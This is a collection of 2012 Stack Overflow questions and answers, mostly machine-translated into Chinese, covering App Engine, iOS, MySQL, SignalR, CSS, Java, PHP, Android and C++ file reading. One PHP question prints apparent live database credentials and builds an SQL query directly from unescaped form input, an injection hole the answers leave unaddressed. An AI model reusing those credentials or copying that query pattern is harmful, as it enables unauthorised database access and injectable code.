您从 Twitter 用户获取数据的过程本质上是递归的，因为您正在为追随者的追随者等获取数据，而这个任务作为一个单一的过程可能非常昂贵并且可能会超过阈值。

> 任务必须在原始请求的 10 分钟内完成执行并发送一个介于 200-299 之间的 HTTP 响应值。此截止日期与用户请求不同，后者有 60 秒的截止日期。如果您的任务执行接近限制，App Engine 会引发 DeadlineExceededError（来自模块 google.appengine.runtime），您可以在截止日期过去之前捕获该错误以保存您的工作或记录进度。如果任务执行失败，App Engine 会根据您可以配置的条件重试它。

但是，如果您将每个 Twitter 用户分成一个完全独立的任务，那么每个任务只运行为获取单个用户的 Twitter 结果所需的时间。这不仅更有效，而且如果在获取用户数据之一时出现问题，只有该任务会失败，而其他任务应该继续执行。

换句话说，不要尝试在单个任务中获取所有数据。

或者，如果在不太可能发生的情况下或出于任何原因，这些任务应该超过 10 分钟的阈值，请查看[Backends](https://developers.google.com/appengine/docs/python/backends/)。

# iphone - How to change the text on a Back Button?

> ID：10676265
> 
> 赞同：2
> 
> 时间：2012-05-20T18:58:49.270
> 
> 标签：iphone, objective-c, back-button, uinavigationitem

I've created a Navigation Controller, with a bar button item. This button leads me to another view, and perfectly creates a back button. I just want to change the text of this button, so I typed it in Navigation Item > Attributes Inspector > Back Button, but it doesn't work and I've the following warning :

> Title set but using a system Identifier (These attributes are mutually exclusive; the Title will be ignored)

What should I do ?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:02:12.720

Changing the Back button is easy, here are ways to change to either text or an image, you will want to place these in your **`viewDidLoad`** method.

## `UIImage`:

```
UIBarButtonItem *backButton = [[UIBarButtonItem alloc] init];
[backButton setImage:[UIImage imageNamed:@"back_home.png"]];
self.navigationItem.backBarButtonItem = backButton;
[backButton release]; 
```

## `NSString`:

```
UIBarButtonItem *backButton = [[UIBarButtonItem alloc] init];
[backButton setTitle:@"Go Back!"];
self.navigationItem.backBarButtonItem = backButton;
[backButton release]; 
```

# mysql - MYSQL：存储过程，插入一行，然后通过 LAST_INSERT_ID() 选择它

> ID：10676268
> 
> 赞同：1
> 
> 时间：2012-05-20T18:59:19.050
> 
> 标签：mysql, stored-procedures, last-insert-id

我正在尝试调用 AddCluster 女巫的存储过程调用参数“title”和“alt”

**情况1：**

如果“标题”在数据库中，则只需返回“旧”行！

**案例二：**

如果“标题”不在数据库中，那么，

根据 parmerer 'title' 和 'alt' 插入一行

然后通过 LAST_INSERT_ID() 选择新添加的行

*问题出在案例 2 上，它只返回空！！*

```
-- --------------------------------------------------------------------------------
-- AddCluster Group Routines
-- --------------------------------------------------------------------------------
DELIMITER $$

CREATE DEFINER=`linkbay_dk`@`%` PROCEDURE `AddCluster`(in in_title varchar(45), in in_alt text)
BEGIN
    /* check if 'in_title' is in db */
    IF EXISTS
    (
        SELECT count(*) FROM Cluster 
        WHERE title=in_title 
    )
    THEN
        /* returns old Cluster there is in db */
        SELECT * FROM Cluster WHERE title=in_title; 
    ELSE
        INSERT INTO Cluster
        (
            `id`,
            `create_at`,
            `title`,
            `alt`
        )
        VALUES
        (
            null,
            NOW(),
            in_title,
            in_alt
        );
        /* returns the newly added Cluster */
        SELECT * FROM Cluster WHERE id=LAST_INSERT_ID();
    END IF;
END$$ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:04:29.290

尝试在不指定 id 的情况下插入：

```
...
ELSE
    INSERT INTO Cluster
    (
        `create_at`,
        `title`,
        `alt`
    )
    VALUES
    (
        NOW(),
        in_title,
        in_alt
    );
    /* returns the newly added Cluster */
    ... 
```

确保`Cluster.id`是一`AUTO_INCREMENT`列，只有这样您才能使用`LAST_INSERT_ID()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T05:34:05.777

只是一点点更新。我发现错误..这是`count(*)`

```
SELECT count(*) FROM Cluster WHERE title=in_title 
```

它应该是这样的：

```
SELECT * FROM Cluster WHERE title=in_title 
```

请参阅此处的孔更新存储过程[！](http://paste.ubuntu.com/1002364/)

# c# - 使用 SignalR 集线器，连接会在一段时间后丢失 - 为什么？

> ID：10676270
> 
> 赞同：5
> 
> 时间：2012-05-20T18:59:24.183
> 
> 标签：c#, asp.net-mvc-3, signalr, keep-alive

在我的 SignalR 应用程序中，回调在页面上按预期触发。如果页面离开一段时间，则在刷新之前不再在该页面上调用回调。

我怀疑这可能是由于站点的会话到期（使用客户端的会话 ID 来调用客户端通知）。

我[在此处](https://github.com/SignalR/SignalR/issues/168)阅读了有关该`KeepAlive`功能的信息，并且可以在 SignalR 代码中看到对它的一些引用。我不清楚是否需要实现客户端保持活动，如果需要，如何实现？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-02T04:40:02.293

看看[http://www.asp.net/signalr/overview/signalr-20/hubs-api/handling-connection-lifetime-events](http://www.asp.net/signalr/overview/signalr-20/hubs-api/handling-connection-lifetime-events)

```
 $.connection.hub.disconnected(function() {
      alert('disconnected')
      setTimeout(function() {
        alert('reconnecting')
        $.connection.hub.start();
      }, 5000); // Restart connection after 5 seconds.
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T04:41:49.497

我没有做任何实验或检查文档，但你的假设是有道理的。SignalR 出于各种充分的理由不支持会话。如果它不支持从会话中读取，那么可以合理地预期它不会刷新会话过期时间。但是，如果您确实需要使用会话 ID 作为客户端 ID（您不应该这样做），那么实现一种保持活动状态很容易。只需编写一些 JS 以最简单的方式调用服务器（例如启用 Session 的 HTTP 处理程序），而无需做任何工作。它仅用于刷新会话到期时间。

# html - 文本未包含在绝对定位的 div 内

> ID：10676271
> 
> 赞同：2
> 
> 时间：2012-05-20T18:59:32.943
> 
> 标签：html, css, text, word-wrap

我在将文本包裹在绝对定位的 div 中时遇到问题。我认为问题是我必须将宽度设置为 100%，因为 div 会随页面调整大小。我怎样才能让文本换行。

这是我的代码：

```
#content {
  background: black;
  min-height: 60px;
  background: #0a0a0a;
  position: relative;
  padding: 0;
  overflow: hidden;
}

#content .entry {
  background: white;
  position: absolute;
  text-wrap: normal;
  top: 0;
  left: 200px;
  padding: 10px;
  width: 100%;
  height: 100%;
  min-height: 50px;
  border-left: 1px solid #262626;
}
```

```
<div id="content">
  <div class="entry">
    <-----text---->
  </div>
</div>
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:32:34.817

问题是您在 .entry 元素上声明了 100% 的宽度和 400px 的左侧。总宽度将为 100% + 400px，这将使 .entry 元素比其容器更宽。它确实包装了它的文本，但你不会看到它最右边的 400 像素。

问题是您不能在同一个元素上定义宽度和填充/边距/左/右/等。您需要一个嵌套结构来完成它。因此，在 content > entry html 结构中添加一个额外的 div，并在第一个上定义宽度，在第二个上定义填充。

# java - 获取 TreeMap 中的三个最高值

> ID：10676281
> 
> 赞同：4
> 
> 时间：2012-05-20T19:00:48.760
> 
> 标签：java, iterator, comparator, treemap

我试图在 TreeMap 中找到三个最高值。我写了一个代码是这样做的，但我想问你是否可以提出一个更有效的方法。基本上，我将文本中的每个单词连同它在文本中出现的次数一起保存在 TreeMap 中。然后我使用比较器对值进行排序。然后我遍历新创建的 Map 直到达到最后三个值，这是排序后的最高值并将它们打印出来。我将使用大文本，所以这不是一个很好的方法。这是我的代码：

```
class Text{
    public static void main(String args[]) throws FileNotFoundException, IOException{
        final File textFile = new File("C://FileIO//cinderella.txt"); 
        final BufferedReader in = new BufferedReader(new FileReader(textFile));                               
        final TreeMap<String, Integer> frequencyMap = new TreeMap<String, Integer>(); 

        String currentLine; 
        while ((currentLine = in.readLine()) != null) {  
            currentLine = currentLine.toLowerCase();  
            final StringTokenizer parser = new StringTokenizer(currentLine, " \t\n\r\f.,;:!?'"); 
            while (parser.hasMoreTokens()) { 
                final String currentWord = parser.nextToken(); 
                Integer frequency = frequencyMap.get(currentWord); 
                if (frequency == null) { 
                    frequency = 0; 
                } 
                frequencyMap.put(currentWord, frequency + 1);
            } 
        }  

        System.out.println("This the unsorted Map: "+frequencyMap);

        Map sortedMap = sortByComparator(frequencyMap);
        int i = 0;
        int max=sortedMap.size();
        StringBuilder query= new StringBuilder();

        for (Iterator it = sortedMap.entrySet().iterator(); it.hasNext();) {
            Map.Entry<String,Integer> entry = (Map.Entry<String,Integer>) it.next();
            i++;
            if(i<=max && i>=(max-2)){
                String key = entry.getKey();
                //System.out.println(key);
                query.append(key);
                query.append("+");
            }
        }
        System.out.println(query);
    }

    private static Map sortByComparator(TreeMap unsortMap) {
        List list = new LinkedList(unsortMap.entrySet());

        //sort list based on comparator
        Collections.sort(list, new Comparator() {
            public int compare(Object o1, Object o2) {
                return ((Comparable) ((Map.Entry) (o1)).getValue())
                       .compareTo(((Map.Entry) (o2)).getValue());
            }
        });

        //put sorted list into map again
        Map sortedMap = new LinkedHashMap();
        for (Iterator it = list.iterator(); it.hasNext();) {
            Map.Entry entry = (Map.Entry)it.next();
            sortedMap.put(entry.getKey(), entry.getValue());

        }
        return  sortedMap;
    }   
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:14:47.407

我会用哈希图计算频率，然后遍历它们，选择前 3 个。这样可以最大限度地减少比较，并且永远不必排序。使用[选择算法](http://en.wikipedia.org/wiki/Selection_algorithm)

-edit，维基百科页面详细介绍了选择算法的许多不同实现。具体来说，只需使用有界优先级队列，并将大小设置为 3。不要花哨，将队列实现为堆或任何东西。只需使用一个数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:59:53.590

如果您真的想要一个可扩展且闪电般快速的解决方案，请查看 Lucene，因为这种事情是它在早上起床之前所做的事情。您所要做的就是用您的所有文本为单个文档编制索引，然后检索排名靠前的术语。在某处有一段代码可以找到排名靠前的术语，其中涉及`PriorityQueue`. 我在 Clojure 中有一份副本，即使您不了解该语言，您也可以从中收集相关的 API 调用（或者至少通过他们谷歌搜索并找到 Java 版本）：

```
(defn top-terms [n]
  (let [f "field-name"
        tenum (-> ^IndexSearcher searcher .getIndexReader (.terms (Term. f)))
        q (proxy [org.apache.lucene.util.PriorityQueue] [] 
            (lessThan [a b] (< (a 0) (b 0))))]
    (-> org.apache.lucene.util.PriorityQueue
        (.getDeclaredMethod "initialize" (into-array [Integer/TYPE]))
        (doto (.setAccessible true)) (.invoke q (into-array [(Integer/valueOf n)])))
    (loop [] (when (= (-> tenum .term .field) f)
               (.insertWithOverflow q [(.docFreq tenum) (.term tenum)])
               (when (.next tenum) (recur))))
    (loop [terms nil] (if (> (.size q) 0) (recur (conj terms (.pop q))) terms)))) 
```

# java - 如何显示打印对话框

> ID：10676282
> 
> 赞同：0
> 
> 时间：2012-05-20T19:00:49.953
> 
> 标签：java, database, printing

我一直在想办法做到这一点，希望有人能帮助我。

我的数据库（MS Access）中填充了一个表。我知道如何从数据库中检索数据，但我想说创建一个用户可以在纸上打印出来的报告。我需要知道如何添加这样的选项。

如果我能解决这个问题，那就太棒了！

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:05:32.220

您可以将报告保存在临时文件中，即`tempFile`，然后调用：

```
 Desktop.getDesktop().print(tempFile); 
```

# php - PHP 向 XML 提交错误代码

> ID：10676285
> 
> 赞同：-1
> 
> 时间：2012-05-20T19:01:14.323
> 
> 标签：php, xml

我有一个 xml 文件 (scores.xml)，我使用 php 代码向它添加新标签。

我有一个名为 Header 的标签，其中包含一些 html 代码

```
<![CDATA[<tr><td colspan='7' id='headertd'>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img border='0' src='images/euro.png' />
&nbsp;&nbsp;&nbsp;&nbsp;
UEFA Euro 2012 Qualifications</td></tr>]]> 
```

当我以 pgp 脚本的形式编写此代码并提交除标头标记外的所有 XML 文件时，一切正常......我在 php 脚本中遇到错误，并且代码在 xml 标记中是这样的：

```
&lt;![CDATA[&lt;tr&gt;&lt;td colspan='7' id='headertd'&gt;&#13;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#13;
&lt;img border='0' src='images/euro.png' /&gt;&#13;
&nbsp;&nbsp;&nbsp;&nbsp;&#13;
UEFA Euro 2012 Qualifications&lt;/td&gt;&lt;/tr&gt;]]&gt; 
```

所以我的xml得到了错误的信息......无论如何我可以解决这个问题吗？并避免这些代码的转换？

那是我的 php 代码：

```
<?php
if (isset($_POST['submitted'])) {//If the user submitted the form, then add to the XML file
    //Load the scores XML file
    $scores = new DOMDocument();
    $scores -> load('../scores.xml');

    //Get the <Games> tag
    $games = $scores -> getElementsByTagName('Games');

    //Create the new <Game> tag 

    $newGame = $scores -> createElement("Game");
    $newGame -> appendChild($scores -> createElement("Header", $_POST['header']));

    //Add the new <Game> tag under the <Games> tag
    $games -> item(0) -> appendChild($newGame);

    //Save again
    $scores -> save('../scores.xml');

    echo "New game added.";
}
?>

<form id="form1" method="post" action="">
Header: <textarea style=" color:#000;" name="header" cols="73" rows="6" > </textarea>
<br><input type="submit" name="submitted" name="Add new row">
</form> 
```

我没有用户界面，我只是使用这个脚本让我更容易在我的网站上发布东西！

非常感谢您的帮助！

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:27:47.307

[edit 2] 嗯，不好意思答错了，我在想，但是PHP脚本将其转换为“编码”形式是很正常的，因为当您添加html标签时，xml结构将被破坏所以它必须被编码。因此，稍后当您尝试检索数据时，您必须使用 html_entity_decode() 对其进行解码，以将其正确导出到浏览器。

[edit1] 如我所见，内容是“编码的”，因此在保存数据之前使用 html_entity_decode() 对其进行解码。这里是“最终”代码：

```
<?php
if (isset($_POST['submitted'])) {//If the user submitted the form, then add to the XML file
    //Load the scores XML file
    $scores = new DOMDocument();
    $scores -> load('../scores.xml');

    //Get the <Games> tag
    $games = $scores -> getElementsByTagName('Games');

    //Create the new <Game> tag 

    $newGame = $scores -> createElement("Game");
    $newGame -> appendChild($scores -> createElement("Header", html_entity_decode($_POST['header'])));

    //Add the new <Game> tag under the <Games> tag
    $games -> item(0) -> appendChild($newGame);

    //Save again
    $scores -> save('../scores.xml');

    echo "New game added.";
}
?>

<form id="form1" method="post" action="">
Header: <textarea style=" color:#000;" name="header" cols="73" rows="6" > </textarea>
<br><input type="submit" name="submitted" name="Add new row">
</form> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:28:02.390

在将内容放入标签之前尝试对内容使用[html_entity_decode 。](http://www.php.net/manual/en/function.html-entity-decode.php)`$_POST['header']``<Game>`

# xcode4 - 从一种视图切换到另一种视图

> ID：10676293
> 
> 赞同：0
> 
> 时间：2012-05-20T19:02:18.573
> 
> 标签：xcode4

我有一个带有 tableview 的视图控制器，我会让任何一行的新闻，总是去同一个视图。我试过这样： cntrl + 单击视图的第一个单元格，朝向另一个视图。(storyboard segues - push) 出现一个新的箭头，但它并没有达到我希望的效果。（我从一个数组创建了一个表格视图）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T05:03:35.517

你为什么不尝试这样的事情：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{
MyViewController *myViewControllerScreen = [[MyViewController alloc] init];
[[self navigationController] pushViewController:myViewControllerScreen animated:YES];
[myViewControllerScreen release];
} 
```

这将始终带您到“MyViewController”

希望这就是你要找的

# php - MySQL 时间戳字段未在表单提交时更新

> ID：10676294
> 
> 赞同：0
> 
> 时间：2012-05-20T19:02:24.623
> 
> 标签：php, mysql, html, forms, timestamp

我的网站 (mconchicago.com/Contact_Us) 上有一份联系我们提交表格。

应该设置它，以便每次提交都获得一个自动编号和当前时间戳。除了时间戳之外，一切现在都在工作，这让我陷入了疯狂的边缘。每次都是零。

这是上传时记录的样子：

[http://www.mconchicago.com/Screenshots/Records.jpg](http://www.mconchicago.com/Screenshots/Records.jpg)

这就是我配置时间戳字段的方式：

[http://www.mconchicago.com/Screenshots/Structure.jpg](http://www.mconchicago.com/Screenshots/Structure.jpg)

这是我最后一次尝试使 PHP 工作：

```
<?   
$id=$_POST['mysql_insert_id()']; 
$first_name=$_POST['first_name'];
$last_name=$_POST['last_name']; 
$company=$_POST['company'];
$email=$_POST['email'];
$address=$_POST['address']; 
$city=$_POST['city']; 
$state=$_POST['state'];
$zip=$_POST['zip'];
$phone=$_POST['phone'];
$reason=$_POST['reason'];
$comments=$_POST['comments'];
$timestamp=$_POST['UNIX_TIMESTAMP()'];
mysql_connect("emellis2002.db.9243147.hostedresource.com", "emellis2002", "Newpwd99@") or die(mysql_error()); 
mysql_select_db("emellis2002") or die(mysql_error()); 
mysql_query("INSERT INTO `data` VALUES ('$id', '$first_name', '$last_name', '$company', '$email', '$address', '$city', '$state', '$zip', '$phone', '$reason', '$comments', 'timestamp')");  
Print "Your information has been received.  Thank you for getting in touch.<br><br>"; 
Print "<a href=http://www.mconchicago.com/Contact_Us.html>CLICK HERE</a> to return to our web site." 
?> 
```

您可以从 Structure 屏幕截图中看到，我尝试了许多不同的语法组合，但都没有成功，在此过程中查看了许多论坛帖子。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:08:33.000

最好使用 MYSQL DEFAULT_VALUE 属性。

编辑表并将 CURRENT_TIMESTAMP 放入 DEFAULT_VALUE。

每次在表中完成插入时，这将在时间戳列中插入 MYSQL 服务器的当前时间戳。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:22:16.843

几点：

```
$timestamp=$_POST['UNIX_TIMESTAMP()']; 
```

您正在查看名为 UNIX_TIMESTAMP() 的 POST 值。您可能打算：

```
$timestamp = 'UNIX_TIMESTAMP()'; 
```

还：

```
mysql_query("INSERT INTO `data` VALUES ('$id', '$first_name', '$last_name', '$company', '$email', '$address', '$city', '$state', '$zip', '$phone', '$reason', '$comments', 'timestamp')"); 
```

您正在尝试将字符串`timestamp`插入该字段。你可能是说`$timestamp`

# android - Play 应用内计费不会返回到应用程序

> ID：10676298
> 
> 赞同：0
> 
> 时间：2012-05-20T19:02:59.283
> 
> 标签：android, callback, google-play, in-app-billing

在测试 Google Plays In Application Billing 时，我正在成功运行 Dungeons 示例。但是当我尝试在我的应用程序中实现它时，我没有让它成功工作。

失败点是在我的应用程序启动 Google Play-intent 之后，付款完成并且我的应用程序应该返回到 BillingReciver 中的 onRecive 方法。但我从来没有进入 onRecive 方法......

下面是 AndroidManifest.xml 的相关部分

```
<service android:name="BillingService" />
    <receiver android:name="BillingReceiver">
        <intent-filter>
            <action android:name="com.digitalwebb.vending.billing.IN_APP_NOTIFY" />
            <action android:name="com.digitalwebb.vending.billing.RESPONSE_CODE" />
            <action android:name="com.digitalwebb.vending.billing.PURCHASE_STATE_CHANGED" />                
        </intent-filter>
    </receiver> 
```

我想我错过了一些东西，但现在经过两天的搜索，我需要有人让我朝着正确的方向前进......

提前感谢罗兰

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-29T17:13:42.717

我自己没有亲自配置应用内计费，但​​我认为您必须为意图过滤器使用 ANDROID 名称。

```
<receiver android:name="BillingReceiver">
  <intent-filter>
    <action android:name="com.android.vending.billing.IN_APP_NOTIFY" />
    <action android:name="com.android.vending.billing.RESPONSE_CODE" />
    <action android:name="com.android.vending.billing.PURCHASE_STATE_CHANGED" />
  </intent-filter>
</receiver> 
```

而不是您自己的自定义名称。

即，使用`com.android.vending.billing`而不是`com.digitalwebb.vending.billing`

# c++ - 多线程应用程序中最快的文件读取

> ID：10676299
> 
> 赞同：8
> 
> 时间：2012-05-20T19:02:59.347
> 
> 标签：c++, multithreading, file-read

我必须将 8192x8192 矩阵读入内存。我想尽可能快地完成它。
现在我有这个结构：

```
char inputFile[8192][8192*4]; // I know the numbers are at max 3 digits
int8_t matrix[8192][8192]; // Matrix to be populated

// Read entire file line by line using fgets
while (fgets (inputFile[lineNum++], MAXCOLS, fp));

//Populate the matrix in parallel, 
for (t = 0; t < NUM_THREADS; t++){
    pthread_create(&threads[t], NULL, ParallelRead, (void *)t);
} 
```

在函数`ParallelRead`中，我解析每一行，执行`atoi`并填充矩阵。并行性是逐行的，就像线程 t 解析行`t, t+ 1 * NUM_THREADS..`

在具有 2 个线程的双核系统上，这需要

```
Loading big file (fgets) : 5.79126
Preprocessing data (Parallel Read) : 4.44083 
```

有没有办法进一步优化这个？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-05-20T20:49:19.107

这样做是个坏主意。如果您有足够的内核但您仍然只有一个硬盘，线程可以获得更多的 CPU 周期。所以难免线程无法提高读取文件数据的速度。

他们实际上使情况变得更糟。当您按顺序访问文件时，从文件中读取数据的速度最快。这最大限度地减少了读取器磁头寻道的次数，这是迄今为止磁盘驱动器上最昂贵的操作。通过将读取拆分到多个线程中，每个线程读取文件的不同部分，您正在使阅读器的头部不断地来回跳跃。对吞吐量非常非常不利。

仅使用*一个*线程读取文件数据。通过在加载文件数据块后启动线程，您可以将其与文件数据的一些计算周期重叠。

*请*注意测试效果。当您重新运行程序时，通常是在稍微调整代码之后，程序很可能可以在文件系统缓存中找到文件数据，因此不必从磁盘读取它。这是非常快的内存总线速度，内存到内存的复制。很可能在您的数据集上，因为它不是很大并且很容易适应现代机器的 RAM 量。这不会（通常）发生在生产机器上。所以一定要清除缓存以获得真实的数字，不管你的操作系统需要什么。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:30:18.453

尝试使用诸如 fread 之类的加载字符数组的父线程将 1 io 中的所有内容加载为一个很棒的大字符串。

让父母遍历字符串，找到 1 行，或根据大小计算第一行的位置。将该行的处理交给一个线程。下一行，冲洗，重复，直到 EOF。与线程同步。完毕。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T19:58:54.780

值得考虑的一件事是分配两个较小的输入缓冲区（假设它们每个将是 200 行）。

然后让一个线程将数据读入输入缓冲区。当一个输入缓冲区已满时，将其传递给执行解析的第二个线程。第二个线程可以使用线程池进行并发解析（检查 openMP）。

您将不得不使用锁/互斥锁来确保任一线程具有独占访问权限。

这会更好，因为现在解析与读取文件是并发的，并且您对缓冲区的内存访问更加本地化并且适合您的 CPU 缓存。这可以提高读取和解析速度。

如果 fgets 是瓶颈，您还可以将文件作为二进制文件读入内存。这可以提高读取速度，但需要您进行额外的解析，并使上述优化更难执行。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-20T20:33:15.060

使用文件 I/O 可以获得的最佳性能是通过内存映射。[这是一个例子](https://stackoverflow.com/a/46005/267482)。我将从单线程设计开始，如果后加载处理被证明是一个瓶颈，请使其并行。

# ruby-on-rails - Undefined method 'stringify_keys' error when using many to many association

> ID：10676300
> 
> 赞同：0
> 
> 时间：2012-05-20T19:03:01.343
> 
> 标签：ruby-on-rails, ruby-on-rails-3, associations

There are lots of stringify_keys questions here, but i can't find proper match to my problem, so i'll appreciate at least any example matching it.

I have three models named Song, Mixtape and MixtapeSong.

```
class Song < ActiveRecord::Base
  attr_accessible :duration, :name, :order

  belongs_to :album

  has_many :mixtape_songs
  has_many :mixtapes, :through => :mixtape_songs
end

class Mixtape < ActiveRecord::Base
  attr_accessible :description, :image, :name

  has_many :mixtape_songs
  has_many :songs, :through => :mixtape_songs
end

class MixtapeSong < ActiveRecord::Base
  attr_accessible :mixtape_id, :order, :song_id
  belongs_to :mixtape
  belongs_to :song
end 
```

When i tried below commands through rails console, i succeed to add a record to mixtape_songs table with mixtape_id and song_id values but also with an 'order' NULL:

```
mtape = Mixtape.find(1)
song  = Song.find(3)
mtape.songs << song 
```

Also executing an update_attributes was failed with 'Undefined method signify_keys' error.

```
params = [:mixtape_id => 1, :song_id => 3, :order => 2]
mts = MixtapeSong.find(1)
mts.update_attributes(params) 
```

What i need to do is adding this association through Mixtape model with specifying an 'order' value or through MixtapeSong model without 'Undefined method signify_keys' error.

I guess the right way is adding through Mixtape model but i can't figure out how to set 'order'? Any help is appreciated.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:48:46.600

Fetching:

```
mtape = Mixtape.find(1)
songs_in_proper_order = mtape.songs.order(mixtape_songs: :created_at) 
```

Swapping:

```
MixtapeSong.transaction do
    ms1 = MixtapeSong.find(1)
    ms2 = MixtapeSong.find(2)

    ms1.created_at, ms2.created_at = ms2.created_at, ms1.created_at

    ms1.save
    ms2.save
end 
```

# php - 发送 POST 请求而不提交 HTML 表单

> ID：10676302
> 
> 赞同：3
> 
> 时间：2012-05-20T19:03:05.763
> 
> 标签：php, post

我想知道，是否可以在不使用 HTML 表单的情况下在 PHP 中发送 HTTP POST。这可以在内部使用 PHP 完成吗？如果没有，也许使用 JavaScript 或 jQuery？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-20T19:04:21.613

是的你可以。更简单的解决方案是使用[curl](http://php.net/curl)。此外，您可以只[打开一个](http://php.net/fsockopen)到远程服务器的套接字并发送原始 HTTP 请求。

请参阅文档中的[curl 示例](http://php.net/manual/en/function.curl-setopt.php)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-20T19:14:40.923

有几种方法可以在 PHP 中创建 POST 请求，这是使用裸 PHP 代码，不需要外部库：

```
<?php
function postRequest($url, $data, $optionalHeaders = null)
{
    $params = array('http' => array(
        'method' => 'POST',
        'content' => $data
    ));
    if ($optionalHeaders !== null) {
        $params['http']['header'] = $optionalHeaders;
    }

    $ctx = stream_context_create($params);
    $fp = @fopen($url, 'rb', false, $ctx);
    if (!$fp) {
        throw new Exception("Problem with $url, $errormsg");
    }
    $response = @stream_get_contents($fp);
    if ($response === false) {
        throw new Exception("Problem reading data from $url, $errormsg");
    }

    return $response;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T19:06:18.557

是的。几乎可以使用任何语言发送 HTTP POST 或 GET 请求。我不是 PHP 专家，但尝试寻找一种处理 HTTPRequests 的方法，并使用此类库的方法将 POST 数据添加到请求中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-18T08:23:21.740

您可以使用 cURL php 扩展。您可以在下面检查代码：

```
<?php
function httpPost($url,$params){
  $postData = '';
   //create name value pairs seperated by &
   foreach($params as $k => $v)
   {
      $postData .= $k . '='.$v.'&';
   }
   rtrim($postData, '&');

$ch = curl_init(); 

curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_POST, count($postData));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);   

$output=curl_exec($ch);

curl_close($ch);
return $output;

}

$params = array(
   "name" => "Ravishanker Kusuma",
   "age" => "32",
   "location" => "India"
);

echo httpPost("http://www.jmediatechnology.eu/script.php",$params);
?> 
```

更多示例：http: [//hayageek.com/php-curl-post-get/#curl-post](http://hayageek.com/php-curl-post-get/#curl-post)

# mysql - XAMPP Mac MYSQL 错误（未找到 MySQL PID）

> ID：10676303
> 
> 赞同：0
> 
> 时间：2012-05-20T19:03:17.993
> 
> 标签：mysql, macos, xampp

当我尝试在 XAMPP 和 Mac 计算机上启动我的 MYSQL 服务器时。我使用此命令尝试启动它：

`/Applications/XAMPP/xamppfiles/share/mysql/mysql.server force-reload`

在我使用它之后，我得到了这个错误 `ERROR! MySQL PID file could not be found!`

如果有帮助，我也在使用 osx lion

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T16:22:30.383

通过重新启动我自己的计算机来解决此问题。

# sql - 按记录分组，然后从每个组中获取最后一个升序排序的记录？

> ID：10676308
> 
> 赞同：2
> 
> 时间：2012-05-20T19:03:41.393
> 
> 标签：sql, sql-server, sql-server-2008, tsql, sql-server-2005

我有一张桌子：

```
| P_id | Month |  Year  |  Name  |
   624     09     2009    Test1
   600     10     2010    Test2
   624     10     2010    Test6
   600     09     2011    Test7 
```

1.  我想按`P_id`降序、`Year`升序、`Month`升序排列我的桌子

2.  根据我想要每个的最后一条记录的顺序`P_id`。

运行第 1 步后：

```
| P_id | Month |  Year  |  Name  |
  624     09      2009    Test1
  624     10      2010    Test6
  600     10      2010    Test2
  600     09      2011    Test7 
```

期望的输出：

```
| P_id | Month |  Year  |  Name  |
   624     10     2010    Test6
   600     09     2011    Test7 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:11:51.330

你可以使用`row_number`：

```
select  *
from    (
        select  row_number() over (
                  partition by p_id
                  order by year desc, month desc) as rn
        ,       *
        from    YourTable
        ) as SubQueryAlias
where   rn = 1 
```

子查询是必需的，因为您不能`row_number`直接在`where`子句中使用。

# javascript - 无法阅读

> ID：10676309
> 
> 赞同：-3
> 
> 时间：2012-05-20T19:03:43.627
> 
> 标签：javascript, html, css

我有一个小问题。我似乎无法让脚本识别 h3 标签。我不能只保留它`h3`，我必须为其添加一个类。

**标记：**

```
<h3 class="jjheader">
    <?php echo $listitem->title ?>
</h3> 
```

**CSS：**

```
#accordion h3.jjheader { 
    padding: 8px 8px 8px 8px; 
    font-weight: bold; 
    font-size: 12px; 
    color: #666666;
    margin-top: 5px; 
    cursor: pointer; 
    border: 1px solid #444444;
    border-radius: 8px;
    background: #151515;
} 
```

如果我不向 h3 添加一个类并在下面的脚本中替换`.jjheader`为，它可以正常工作`h3`，但是对于类，它不会。

**脚本：**

```
<script type="text/javascript">
     var parentAccordion=new TINY.accordion.slider('parentAccordion'); 
     parentAccordion.init('accordion','.jjheader',0,1,'accordion-selected');
</script> 
```

该手风琴基于来自[http://www.scriptiny.com/2009/03/accordion/的 TinyAccordion JavaScript Accordion 包](http://www.scriptiny.com/2009/03/accordion/)

有人可以指出正确的方向吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:20:01.833

